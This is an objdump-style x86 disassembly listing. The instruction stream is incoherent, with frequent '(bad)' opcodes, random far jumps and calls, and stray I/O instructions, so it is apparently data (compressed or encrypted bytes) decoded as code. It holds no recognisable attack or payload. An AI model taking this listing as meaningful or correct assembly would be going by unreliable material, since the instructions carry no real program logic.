  422f02:	inc    esi
  422f03:	dec    edi
  422f04:	pop    esp
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR [ecx+eax*1],al
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	xor    dl,BYTE PTR [eax]
  422f0e:	or     ebx,esp
  422f10:	push   0x39ea0bc0
  422f15:	pop    esi
  422f16:	popa   
  422f17:	add    cl,BYTE PTR [ecx+eax*1-0x5c3b602b]
  422f1e:	loopne 0x422eeb
  422f20:	cwde   
  422f21:	stos   DWORD PTR es:[edi],eax
  422f22:	test   DWORD PTR [esi+0x6],esp
  422f25:	stos   DWORD PTR es:[edi],eax
  422f26:	lea    edi,[eax+0x32d98c0b]
  422f2c:	and    eax,0xd4e88d49
  422f31:	dec    edi
  422f32:	adc    ch,BYTE PTR [edi-0x4b]
  422f35:	rol    BYTE PTR [edi],1
  422f37:	stc    
  422f38:	push   es
  422f39:	fisttp WORD PTR [eax]
  422f3b:	(bad)  
  422f3c:	or     eax,ecx
  422f3e:	cli    
  422f3f:	in     eax,0x26
  422f41:	retf   
  422f42:	mov    al,0xf0
  422f44:	sbb    al,BYTE PTR [ebp-0x25]
  422f47:	sbb    ah,BYTE PTR [edi-0x3f5d3c86]
  422f4d:	cmp    eax,0x136bf79e
  422f52:	fdivr  st,st(4)
  422f54:	jo     0x422f6b
  422f56:	push   edx
  422f57:	and    ecx,DWORD PTR [edi+edi*1]
  422f5a:	inc    edi
  422f5b:	lock or DWORD PTR [ebx+0x26e690ca],eax
  422f62:	pop    ebx
  422f63:	xchg   BYTE PTR [ebx+0x2329916e],ch
  422f69:	push   ecx
  422f6a:	cmp    DWORD PTR [ebx],0xfffffff9
  422f6d:	mov    bl,BYTE PTR [esi+0x293e8ceb]
  422f73:	ror    BYTE PTR [ebx],cl
  422f75:	lods   eax,DWORD PTR ds:[esi]
  422f76:	pusha  
  422f77:	pop    eax
  422f78:	sub    BYTE PTR [eax-0x18aab03f],dh
  422f7e:	jae    0x422f1c
  422f80:	dec    ebp
  422f81:	nop
  422f82:	jmp    0x6af1:0x9825d9af
  422f89:	jmp    0x422ff4
  422f8b:	jg     0x422f6d
  422f8d:	push   edx
  422f8e:	loopne 0x422fc7
  422f90:	cli    
  422f91:	and    edi,edx
  422f93:	xor    ch,BYTE PTR [ebx+0x67b2dc51]
  422f99:	sub    eax,0x325cd9d8
  422f9e:	ins    BYTE PTR es:[edi],dx
  422f9f:	sub    al,0x1
  422fa1:	dec    ebx
  422fa2:	mov    ds:0xdc9add42,al
  422fa7:	sub    al,0x51
  422fa9:	hlt    
  422faa:	retf   0x88bf
  422fad:	jp     0x422f9b
  422faf:	lea    eax,[eax]
  422fb1:	addr16 retf 0x4dff
  422fb5:	mov    dl,BYTE PTR [ecx-0x33]
  422fb8:	das    
  422fb9:	aam    0xc4
  422fbb:	adc    esp,DWORD PTR [esi-0x4e]
  422fbe:	lods   al,BYTE PTR ds:[esi]
  422fbf:	jp     0x422f4f
  422fc1:	or     eax,0x589647d4
  422fc6:	sub    eax,0x123b8f6d
  422fcb:	push   ebp
  422fcc:	push   edx
  422fcd:	inc    ebx
  422fce:	stc    
  422fcf:	xor    ebp,ecx
  422fd1:	cmp    BYTE PTR [esi+0x22264879],cl
  422fd7:	inc    edx
  422fd8:	inc    ebp
  422fd9:	or     cl,al
  422fdb:	pop    edx
  422fdc:	add    eax,0x7da3d90c
  422fe1:	mov    cl,0xd5
  422fe3:	mov    ch,BYTE PTR [ebx+eax*4+0x1423f355]
  422fea:	xchg   BYTE PTR [ecx],al
  422fec:	lea    esp,[edx+0x6c]
  422fef:	jecxz  0x422fb8
  422ff1:	scas   al,BYTE PTR es:[edi]
  422ff2:	out    0x70,al
  422ff4:	fnstenv [ebx+0x4c]
  422ff7:	inc    ebx
  422ff8:	jl     0x422fe3
  422ffa:	mov    ecx,0x8ea9b56d
  422fff:	pushw  ds
  423001:	aas    
  423002:	mov    eax,ds:0x7e05497
  423007:	cmp    dh,BYTE PTR [esi]
  423009:	jg     0x42301d
  42300b:	nop
  42300c:	je     0x422fc7
  42300e:	lahf   
  42300f:	loope  0x423011
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ecx+edi*2+0x6061f8e9],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	cwde   
  42308d:	inc    edi
  42308e:	inc    edx
  42308f:	mov    edx,0x410802b2
  423094:	jne    0x423079
  423096:	xchg   DWORD PTR [esi],edx
  423098:	pop    ss
  423099:	scas   eax,DWORD PTR es:[edi]
  42309a:	rcl    BYTE PTR ds:0xa6a9241f,cl
  4230a0:	out    dx,al
  4230a1:	cmp    al,0x2e
  4230a3:	stos   DWORD PTR es:[edi],eax
  4230a4:	mov    esi,0xe18fcdba
  4230a9:	mov    esi,0xa204dcc5
  4230ae:	pop    es
  4230af:	inc    ecx
  4230b0:	das    
  4230b1:	sub    BYTE PTR [ecx-0x19],0x9b
  4230b5:	xchg   edx,eax
  4230b6:	push   eax
  4230b7:	mov    BYTE PTR [ebx],ah
  4230b9:	xor    bl,cl
  4230bb:	push   edx
  4230bc:	sbb    DWORD PTR [esi-0x4],eax
  4230bf:	pop    ebx
  4230c0:	out    0xa6,al
  4230c2:	xchg   esp,eax
  4230c3:	pop    es
  4230c4:	in     eax,dx
  4230c5:	call   0xa110:0x34a70e1d
  4230cc:	sub    al,0xea
  4230ce:	in     al,0x25
  4230d0:	push   ebp
  4230d1:	dec    ebx
  4230d2:	imul   esp,DWORD PTR [edi+0x3d],0x53
  4230d6:	lds    esi,FWORD PTR [ecx-0x35a1fd0]
  4230dc:	sbb    DWORD PTR fs:[esi+0x62],0x442f83cc
  4230e4:	shl    DWORD PTR [esi+esi*2],0xff
  4230e8:	jecxz  0x423123
  4230ea:	popa   
  4230eb:	mov    esi,0x7f5a0ec4
  4230f0:	push   edi
  4230f1:	pop    ecx
  4230f2:	sub    al,0x38
  4230f4:	test   eax,0x845b24e5
  4230f9:	mov    edx,0x84a50c45
  4230fe:	in     al,dx
  4230ff:	xor    DWORD PTR [edi-0x62de1894],0x5e58708c
  423109:	std    
  42310a:	rcr    DWORD PTR [eax-0x24d8bdf6],cl
  423110:	(bad)  
  423111:	mov    edi,0xaf5a5354
  423116:	std    
  423117:	add    bl,BYTE PTR [esi]
  423119:	xchg   ebx,eax
  42311a:	lock sti 
  42311c:	sub    dh,BYTE PTR [ecx-0x53]
  42311f:	xchg   edx,eax
  423120:	sub    DWORD PTR [edi-0x17],eax
  423123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423124:	jo     0x4230e1
  423126:	jl     0x423137
  423128:	and    al,0xe5
  42312a:	out    dx,eax
  42312b:	mov    bh,0x79
  42312d:	sbb    eax,0xd7c3606b
  423132:	adc    al,BYTE PTR [edx+ebp*4+0x17]
  423136:	out    0x65,al
  423138:	ror    ch,1
  42313a:	retf   
  42313b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42313c:	jne    0x423135
  42313e:	popa   
  42313f:	aas    
  423140:	mov    al,cl
  423142:	inc    DWORD PTR [ecx+0x29]
  423145:	sbb    eax,DWORD PTR [ebp+0x4125324e]
  42314b:	mov    esp,0xc7c2e1be
  423150:	stos   DWORD PTR es:[edi],eax
  423151:	neg    ecx
  423153:	(bad)  
  423154:	jo     0x4231a0
  423156:	mov    edx,0x30ca6fcb
  42315b:	inc    ecx
  42315c:	in     al,dx
  42315d:	loopne 0x423160
  42315f:	push   ds
  423160:	repz in eax,dx
  423162:	stos   BYTE PTR es:[edi],al
  423163:	lock inc esp
  423166:	sub    bh,BYTE PTR [ebx-0x6c]
  423169:	nop
  42316a:	in     al,dx
  42316b:	push   ss
  42316c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42316d:	adc    DWORD PTR ds:0xa1f2af4,ebp
  423173:	adc    ch,cl
  423175:	sub    DWORD PTR [edi+ebx*1],edi
  423178:	xor    ebx,esp
  42317a:	sbb    BYTE PTR [ebp+0x4c],0xc
  42317e:	jne    0x42310d
  423180:	stc    
  423181:	xchg   edi,eax
  423182:	popa   
  423183:	add    eax,0xeaac6957
  423188:	or     DWORD PTR [eax+0x2b11035a],0x40
  42318f:	mov    BYTE PTR [eax],al
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x2b6c3976],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	xor    ecx,ecx
  42320e:	popa   
  42320f:	xor    DWORD PTR [esi+ebx*2+0x24],ebx
  423213:	push   esp
  423214:	lea    esi,[edx]
  423216:	in     al,dx
  423217:	pop    esp
  423218:	mov    bl,0x49
  42321a:	mov    bl,0xe1
  42321c:	push   ds
  42321d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42321e:	jb     0x42323d
  423220:	imul   esp,DWORD PTR [edi+ebp*8],0x39
  423224:	pop    esp
  423225:	mov    al,ds:0x430545fe
  42322a:	xlat   BYTE PTR ds:[ebx]
  42322b:	pop    edi
  42322c:	mov    eax,gs:0x50cf606c
  423232:	scas   eax,DWORD PTR es:[edi]
  423233:	jne    0x42321f
  423235:	sub    ecx,DWORD PTR [ebp-0x61]
  423238:	add    al,0x5
  42323a:	jmp    0x147a:0xc47a9b95
  423241:	sbb    BYTE PTR [edi],0x8
  423244:	ror    ch,cl
  423246:	cmp    DWORD PTR [ecx-0xc],edx
  423249:	dec    ebp
  42324a:	cwde   
  42324b:	or     al,0xc0
  42324d:	or     eax,0xb20709e
  423252:	or     esp,DWORD PTR [ebx-0x59]
  423255:	leave  
  423256:	ret    
  423257:	jne    0x42323e
  423259:	stos   BYTE PTR es:[edi],al
  42325a:	sbb    edi,DWORD PTR [ebp+0x7]
  42325d:	mov    cl,BYTE PTR [ebx-0x31]
  423260:	dec    ecx
  423261:	push   edx
  423262:	inc    edx
  423263:	in     al,0x5a
  423265:	aaa    
  423266:	leave  
  423267:	stos   BYTE PTR es:[edi],al
  423268:	shl    DWORD PTR [esp+edi*8],1
  42326b:	call   0xd43c:0xebf87e5b
  423272:	push   edx
  423273:	jp     0x423242
  423275:	mov    ebp,0x56e35a10
  42327a:	int    0x62
  42327c:	pop    esi
  42327d:	ins    BYTE PTR es:[edi],dx
  42327e:	test   al,0x9a
  423280:	arpl   WORD PTR [esi-0x561d1877],di
  423286:	lds    ebx,FWORD PTR [ecx+0x3e8e5fe]
  42328c:	imul   ebx,DWORD PTR fs:[edi+0x35],0x6eba8fb
  423294:	arpl   WORD PTR [esi+0x74],cx
  423297:	jne    0x4232c5
  423299:	xchg   edi,eax
  42329a:	lds    eax,FWORD PTR [esi]
  42329c:	loope  0x42331b
  42329e:	and    DWORD PTR [ebx],eax
  4232a0:	jne    0x423224
  4232a2:	enter  0x38d4,0xe
  4232a6:	mov    edi,0xa5aba32c
  4232ab:	outs   dx,BYTE PTR ds:[esi]
  4232ac:	bound  ecx,QWORD PTR [eax]
  4232ae:	sbb    eax,0x79d7d186
  4232b3:	push   esp
  4232b4:	mov    esi,0x2315c241
  4232ba:	mov    ebx,edi
  4232bc:	int3   
  4232bd:	jl     0x423318
  4232bf:	pop    esp
  4232c0:	xchg   ebx,eax
  4232c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232c2:	in     eax,0x66
  4232c4:	bound  edx,QWORD PTR [eax+ebp*4-0x5a]
  4232c8:	retf   
  4232c9:	inc    esi
  4232ca:	jp     0x4232dc
  4232cc:	or     DWORD PTR [esi],edi
  4232ce:	mov    ecx,0xea8bbea6
  4232d3:	inc    ebp
  4232d4:	cmp    ebx,ebx
  4232d6:	pop    ebp
  4232d7:	inc    edx
  4232d8:	inc    bl
  4232da:	or     DWORD PTR [esi-0x21d059e],eax
  4232e0:	ror    edi,0xa8
  4232e3:	mov    dh,0xb8
  4232e5:	push   esi
  4232e6:	mov    ah,0x16
  4232e8:	ja     0x4232c5
  4232ea:	stos   DWORD PTR es:[edi],eax
  4232eb:	adc    al,0xdc
  4232ed:	in     eax,dx
  4232ee:	call   0x4110:0xd62fe514
  4232f5:	fisttp WORD PTR [edi+eiz*4+0xbc45238]
  4232fc:	push   edx
  4232fd:	iret   
  4232fe:	aam    0x55
  423300:	and    DWORD PTR [esi+0x2c],0x44fe10d5
  423307:	jmp    0x56a4f5fa
  42330c:	aam    0x23
  42330e:	sbb    DWORD PTR [ecx+0x0],ebx
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xbd2a0f44
  423382:	or     cl,bh
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    bh,al
  42338d:	cmp    cl,BYTE PTR [ebx-0x2e]
  423390:	add    BYTE PTR [ebp-0x67faae08],ch
  423396:	cmp    ecx,edx
  423398:	mov    ebp,0x3d5b1f76
  42339d:	and    edi,DWORD PTR [edi+ebx*1+0x57]
  4233a1:	retf   0xf6db
  4233a4:	js     0x423374
  4233a6:	push   esp
  4233a7:	outs   dx,BYTE PTR ds:[esi]
  4233a8:	add    al,0x5e
  4233aa:	inc    ecx
  4233ab:	mov    edi,0x8cfd14d5
  4233b0:	sub    eax,0x2d547c34
  4233b5:	popf   
  4233b6:	pop    esi
  4233b7:	gs and BYTE PTR es:[ebx-0x4162f5e4],al
  4233bf:	jmp    0x8dcf:0x61be6b53
  4233c6:	sub    DWORD PTR [edx+0x45],edx
  4233c9:	(bad)  
  4233ca:	jno    0x42339c
  4233cc:	and    al,0xca
  4233ce:	out    0x5c,al
  4233d0:	sub    al,0x99
  4233d2:	inc    edx
  4233d3:	push   esp
  4233d4:	push   ss
  4233d5:	sub    BYTE PTR [ebx-0xb],al
  4233d8:	cli    
  4233d9:	adc    al,0xdc
  4233db:	mov    BYTE PTR [eax+0x7e],bh
  4233de:	loop   0x4233d5
  4233e0:	fcmovu st,st(1)
  4233e2:	mov    bl,0x26
  4233e4:	xor    dl,BYTE PTR [esi-0x24]
  4233e7:	lds    eax,FWORD PTR [ecx+edi*4-0x332e612a]
  4233ee:	or     BYTE PTR [edx+ebx*4],dl
  4233f1:	add    DWORD PTR [edx],esp
  4233f3:	cwde   
  4233f4:	sub    bl,bh
  4233f6:	sub    al,0x14
  4233f8:	jns    0x4233ee
  4233fa:	idiv   DWORD PTR [ecx+0x3afb83fc]
  423400:	dec    edx
  423401:	das    
  423402:	or     BYTE PTR [ebx-0x42182e2c],al
  423408:	shl    DWORD PTR [ebp+0x7a7fe393],1
  42340e:	mov    dl,0xda
  423410:	bound  eax,QWORD PTR [eax+0x1d]
  423413:	(bad)  
  423414:	sbb    esi,DWORD PTR [ecx]
  423416:	shr    DWORD PTR [ecx+0x57],0xb5
  42341a:	add    eax,DWORD PTR [edi+edx*8-0x68]
  42341e:	rcr    DWORD PTR [ebx+0x7d],0xbe
  423422:	mov    al,ds:0x71217979
  423427:	bsr    esi,DWORD PTR [eax]
  42342a:	loopne 0x423492
  42342c:	push   esp
  42342d:	loope  0x423482
  42342f:	xchg   edi,eax
  423430:	adc    al,0xfa
  423432:	jg     0x42341d
  423434:	sbb    ebx,esi
  423436:	inc    esi
  423437:	sbb    eax,0x8a21ef4b
  42343c:	ret    0xf2f4
  42343f:	std    
  423440:	or     BYTE PTR [eax+0x30000bf6],0x6c
  423447:	lea    ecx,[edi+0x5a404908]
  42344d:	aas    
  42344e:	mov    cl,0xf9
  423450:	pushf  
  423451:	icebp  
  423452:	pop    ds
  423453:	jg     0x42347e
  423455:	pop    ds
  423456:	popf   
  423457:	jg     0x42348f
  423459:	jbe    0x4233e7
  42345b:	clc    
  42345c:	lods   al,BYTE PTR ds:[esi]
  42345d:	xlat   BYTE PTR ds:[ebx]
  42345e:	cwde   
  42345f:	fmul   QWORD PTR [esp+eiz*2+0x17]
  423463:	(bad)  
  423466:	jmp    0x6ca60bb1
  42346b:	push   edx
  42346c:	pop    ss
  42346d:	sub    al,BYTE PTR [edi]
  42346f:	push   ds
  423470:	jmp    0x4234c5
  423472:	ror    DWORD PTR [edx+0x46],cl
  423475:	dec    esp
  423476:	push   eax
  423477:	data16 cmc 
  423479:	(bad)  
  42347a:	(bad)  
  42347b:	mov    ds:0x9d2edeb4,al
  423480:	jp     0x42341d
  423482:	mov    eax,ds:0xf353e412
  423487:	scas   eax,DWORD PTR es:[edi]
  423488:	ror    DWORD PTR [ecx],0x69
  42348b:	shr    bh,cl
  42348d:	add    BYTE PTR [edx+0x15],bl
	...
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0xcb1f:0xadf467bf
  423501:	test   DWORD PTR [edx+eax*2+0x1786c],esp
  423508:	add    al,0x1
  42350a:	add    BYTE PTR [eax],al
  42350c:	push   ecx
  42350d:	cmp    edi,esp
  42350f:	push   eax
  423510:	imul   ebp,ecx,0x63
  423513:	xchg   edi,eax
  423514:	mov    ebp,0x889eef11
  423519:	faddp  st(7),st
  42351b:	add    eax,DWORD PTR [eax-0x57]
  42351e:	sbb    esp,DWORD PTR [eax-0x5075bff2]
  423524:	test   al,0xcf
  423526:	call   0xcebe:0xb0c847d1
  42352d:	dec    esi
  42352e:	xchg   edx,eax
  42352f:	sbb    BYTE PTR [esi-0x20cf654e],0x4f
  423536:	sub    bh,dh
  423538:	sbb    al,0xc1
  42353a:	int3   
  42353b:	push   eax
  42353c:	hlt    
  42353d:	xchg   BYTE PTR [edx],ch
  42353f:	mov    ebx,0xe98a7a98
  423544:	lods   eax,DWORD PTR ds:[esi]
  423545:	sub    eax,0x624f07a0
  42354a:	stc    
  42354b:	rol    DWORD PTR [eax-0x37],cl
  42354e:	xor    eax,0x9d016e89
  423553:	ficom  WORD PTR [edx]
  423555:	outs   dx,DWORD PTR ds:[esi]
  423556:	loope  0x4235c6
  423558:	pop    edi
  423559:	rol    DWORD PTR [ebp+0x13b54ac3],1
  42355f:	jae    0x42350a
  423561:	sub    eax,0x492ebd4e
  423566:	dec    ecx
  423567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423568:	out    0x50,eax
  42356a:	xchg   edi,eax
  42356b:	mov    eax,0x6355b9f9
  423570:	mov    ecx,0x2f806c52
  423575:	(bad)
  423579:	or     dh,bh
  42357b:	sbb    dl,BYTE PTR [edx+0x42]
  42357e:	stc    
  42357f:	out    dx,al
  423580:	test   al,0x4d
  423582:	prefetch (bad)
  423583:	or     eax,0xba0859ed
  423588:	rcr    ch,cl
  42358a:	in     eax,0xa1
  42358c:	mov    eax,0xbe84e0c7
  423591:	stos   DWORD PTR es:[edi],eax
  423592:	fild   QWORD PTR [edi+edi*4-0x59281553]
  423599:	cmp    DWORD PTR [esi-0x24],0xffffffe4
  42359d:	cld    
  42359e:	bound  edx,QWORD PTR [esi+0x3c030075]
  4235a4:	inc    ebp
  4235a5:	or     edi,edi
  4235a7:	icebp  
  4235a8:	popa   
  4235a9:	rcl    BYTE PTR [ecx+0x240b0dde],0x8c
  4235b0:	outs   dx,DWORD PTR ds:[esi]
  4235b1:	mov    BYTE PTR [eax+ebp*1-0x31],0xc6
  4235b6:	rcr    al,0x14
  4235b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235ba:	(bad)  [edi+ebp*1-0x6fb9c53b]
  4235c1:	dec    edx
  4235c2:	and    DWORD PTR ds:0x27710e36,esp
  4235c8:	sar    ecx,1
  4235ca:	dec    esp
  4235cb:	adc    edi,DWORD PTR [ebx-0x6ee6f6ec]
  4235d1:	jp     0x423621
  4235d3:	cmp    DWORD PTR ds:0x1539d646,ecx
  4235d9:	sbb    al,0xe5
  4235db:	nop
  4235dc:	mov    DWORD PTR [ebp+0x468ea0c4],esp
  4235e2:	les    esi,FWORD PTR [ebx+0x280059b7]
  4235e8:	dec    esp
  4235e9:	test   ecx,0xc10983c9
  4235ef:	jb     0x42360f
  4235f1:	xor    eax,0x34620d6b
  4235f6:	mov    edi,0xe6c78711
  4235fb:	jo     0x4235ec
  4235fd:	das    
  4235fe:	mov    ds:0xfc554c21,al
  423603:	mov    BYTE PTR ds:0x41c91a96,bh
  423609:	add    eax,0x61589635
  42360e:	test   DWORD PTR [eax+eax*1+0x0],0x0
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x5347d313
  423683:	sbb    DWORD PTR [eax+0x79],esi
  423686:	add    DWORD PTR [eax],eax
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	push   ebx
  42368d:	or     dh,BYTE PTR [eax]
  42368f:	jne    0x4236b0
  423691:	sub    edx,ecx
  423693:	test   eax,0xca5bcede
  423698:	les    esi,FWORD PTR [ebx-0x267bcbd4]
  42369e:	xor    eax,DWORD PTR [ecx]
  4236a0:	inc    edi
  4236a1:	mov    bl,0x3b
  4236a3:	pop    ebx
  4236a4:	cmp    eax,DWORD PTR [esi+0x730b1856]
  4236aa:	dec    BYTE PTR [eax]
  4236ac:	out    0x68,eax
  4236ae:	inc    edx
  4236af:	mov    esi,0x3cd20db
  4236b4:	or     al,0xf7
  4236b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236b7:	inc    esp
  4236b8:	stc    
  4236b9:	cmp    eax,DWORD PTR [ebp+0x1d23ca81]
  4236bf:	jnp    0x423735
  4236c1:	ret    
  4236c2:	rcr    BYTE PTR [esi+0x7d],1
  4236c5:	pop    es
  4236c6:	mov    bl,0x7d
  4236c8:	test   eax,0x20b39432
  4236cd:	mov    eax,0xd02edf7
  4236d2:	lods   al,BYTE PTR ds:[esi]
  4236d3:	xor    eax,0xb13a650e
  4236d8:	jb     0x423714
  4236da:	ins    DWORD PTR es:[edi],dx
  4236db:	cmp    DWORD PTR [edi-0x38],esi
  4236de:	iret   
  4236df:	mov    bl,0x2c
  4236e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236e2:	mov    esi,0x213bd5f1
  4236e7:	sti    
  4236e8:	inc    ebx
  4236e9:	addr16 jns 0x423735
  4236ec:	jne    0x423674
  4236ee:	cmp    BYTE PTR [esi],ch
  4236f0:	call   0x1dc7:0x104e38b7
  4236f7:	std    
  4236f8:	into   
  4236f9:	add    dl,BYTE PTR [edi+esi*2-0x12ac12a6]
  423700:	stos   DWORD PTR es:[edi],eax
  423701:	aad    0xef
  423703:	das    
  423704:	xchg   ebx,eax
  423705:	jge    0x423743
  423707:	(bad)  
  423708:	and    eax,0x6a24efbf
  42370d:	and    al,0xe0
  42370f:	adc    bh,BYTE PTR [eax+0x32b938e9]
  423715:	mov    ah,0x7e
  423717:	jnp    0x42370c
  423719:	adc    eax,0xb8cc9e08
  42371e:	cmp    al,0xb5
  423720:	scas   eax,DWORD PTR es:[edi]
  423721:	and    bh,bh
  423723:	aaa    
  423724:	test   al,0xf8
  423726:	bound  esp,QWORD PTR [eax-0x4b]
  423729:	xchg   esi,eax
  42372a:	sbb    dl,BYTE PTR [esi+0x2d]
  42372d:	sbb    al,0xde
  42372f:	push   0x6a
  423731:	ds ss jnp 0x4236f2
  423735:	jb     0x423705
  423737:	mov    eax,ds:0x9ca7e080
  42373c:	push   ds
  42373d:	test   BYTE PTR [esi-0x18],ah
  423740:	or     DWORD PTR [ebx-0x5fb1f9af],0x97f10911
  42374a:	inc    ebx
  42374b:	cmc    
  42374c:	sub    BYTE PTR [edi],bl
  42374e:	adc    DWORD PTR [ecx+0x2c],esi
  423751:	cmp    ebx,edx
  423753:	fistp  QWORD PTR [eax+0x4e]
  423756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423757:	loope  0x42374b
  423759:	jns    0x4237c7
  42375b:	cwde   
  42375c:	jb     0x423793
  42375e:	xchg   ecx,eax
  42375f:	jo     0x42373f
  423761:	pop    ss
  423762:	dec    edi
  423763:	jno    0x423713
  423765:	fimul  WORD PTR [ebp+0x7b]
  423768:	(bad)  
  42376b:	scas   al,BYTE PTR es:[edi]
  42376c:	xchg   BYTE PTR [ecx+eax*4-0x6f478810],ch
  423773:	mov    esp,0x71bca86c
  423778:	xor    ch,ah
  42377a:	cli    
  42377b:	idiv   DWORD PTR [ebx-0x7ad7b9d6]
  423781:	fidiv  WORD PTR [edx-0x62]
  423784:	sbb    BYTE PTR [edi+ebp*8],bl
  423787:	pop    ds
  423788:	jecxz  0x42370d
  42378a:	cmc    
  42378b:	(bad)  
  42378c:	sbb    eax,0x5e2db3
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0x6727dbb9
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	mov    DWORD PTR [ecx+0x642748fa],eax
  423812:	mov    ecx,0x98d98a29
  423817:	bound  esp,QWORD PTR [esi+0x5ddaca8e]
  42381d:	in     al,0x8f
  42381f:	sub    dl,BYTE PTR [ebx+0x7]
  423822:	and    eax,0xa00d935b
  423827:	xor    ah,BYTE PTR [edx+0x44347ed2]
  42382d:	cmc    
  42382e:	es ss or al,0xbf
  423832:	xor    eax,0xfc05ce88
  423837:	ins    DWORD PTR es:[edi],dx
  423838:	jns    0x4237ca
  42383a:	or     bl,BYTE PTR [ebp-0x751a22de]
  423840:	mov    bl,0xae
  423842:	jge    0x423805
  423844:	inc    ebx
  423845:	aas    
  423846:	inc    esi
  423847:	jnp    0x4237e8
  423849:	and    DWORD PTR [edx+0x71],edi
  42384c:	cmp    eax,0x9f85adf6
  423851:	xlat   BYTE PTR ds:[ebx]
  423852:	cwde   
  423853:	xlat   BYTE PTR ds:[ebx]
  423854:	mov    BYTE PTR [ecx+ecx*4+0x0],dl
  423858:	cmp    al,0xaf
  42385a:	pusha  
  42385b:	inc    edi
  42385c:	repz push 0xffffff85
  42385f:	mov    ecx,0x5a0ae8c4
  423864:	lods   al,BYTE PTR ds:[esi]
  423865:	xadd   edx,eax
  423868:	mov    ecx,0xc89dbf53
  42386d:	enter  0xb145,0x6e
  423871:	xchg   ebx,eax
  423872:	lods   eax,DWORD PTR ds:[esi]
  423873:	ficom  DWORD PTR [esi+0x3d]
  423876:	outs   dx,DWORD PTR ds:[esi]
  423877:	sti    
  423878:	dec    ebp
  423879:	adc    al,0x38
  42387b:	leave  
  42387c:	(bad)  [esi]
  42387e:	jnp    0x423818
  423880:	mov    ds:0xe62ba890,eax
  423885:	jne    0x423900
  423887:	xchg   BYTE PTR [ecx],cl
  423889:	call   0x8ca5235d
  42388e:	aam    0xb9
  423890:	leave  
  423891:	jb     0x423834
  423893:	sub    bh,BYTE PTR [edx+0x16]
  423896:	lea    edi,[ecx-0x5cb68a91]
  42389c:	out    0x31,eax
  42389e:	sub    ch,BYTE PTR [ebp-0x30]
  4238a1:	push   0x1211a850
  4238a6:	cmp    al,0x26
  4238a8:	ins    DWORD PTR es:[edi],dx
  4238a9:	push   ecx
  4238aa:	lea    ecx,[ebp+0x4d87e0c]
  4238b0:	or     BYTE PTR ds:0x5cea4cf8,0xbb
  4238b7:	sub    al,0xf9
  4238b9:	or     al,bl
  4238bb:	pop    edi
  4238bc:	xchg   esp,eax
  4238bd:	dec    esi
  4238be:	pushf  
  4238bf:	test   DWORD PTR [esi-0x1e],0x995d1e25
  4238c6:	test   eax,0xfec8acae
  4238cb:	inc    ebx
  4238cc:	in     al,dx
  4238cd:	cmp    ebx,eax
  4238cf:	sub    BYTE PTR [ebx],dh
  4238d1:	mov    al,ds:0xce66e311
  4238d6:	xchg   DWORD PTR ss:[ebp-0x6b930a45],eax
  4238dd:	or     eax,0x1f88c1d7
  4238e2:	fnstsw WORD PTR [edi-0x805b14c]
  4238e8:	fadd   QWORD PTR [edi]
  4238ea:	iret   
  4238eb:	pop    ebp
  4238ec:	pushf  
  4238ed:	(bad)  
  4238ee:	retf   0x5ee4
  4238f1:	or     BYTE PTR [eax+0x7b],ah
  4238f4:	rcr    al,cl
  4238f6:	pusha  
  4238f7:	mov    eax,ds:0xf8bf96c3
  4238fc:	sub    eax,0xf6145c16
  423901:	fldenv [ebx+esi*2]
  423904:	cs clc 
  423906:	mov    ds:0x8b8a16b5,eax
  42390b:	imul   ebx,DWORD PTR [ecx+0x37b829],0x0
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x48972bbd
  423982:	call   0x1bdb226
  423987:	add    BYTE PTR [ecx+eax*1],al
  42398a:	add    BYTE PTR [eax],al
  42398c:	push   esp
  42398d:	aaa    
  42398e:	jb     0x423949
  423990:	in     al,0x9a
  423992:	cli    
  423993:	push   ebp
  423994:	push   edx
  423995:	mov    bl,0xee
  423997:	jbe    0x423967
  423999:	loop   0x42391d
  42399b:	shr    DWORD PTR ds:0xd6379dc4,0x3d
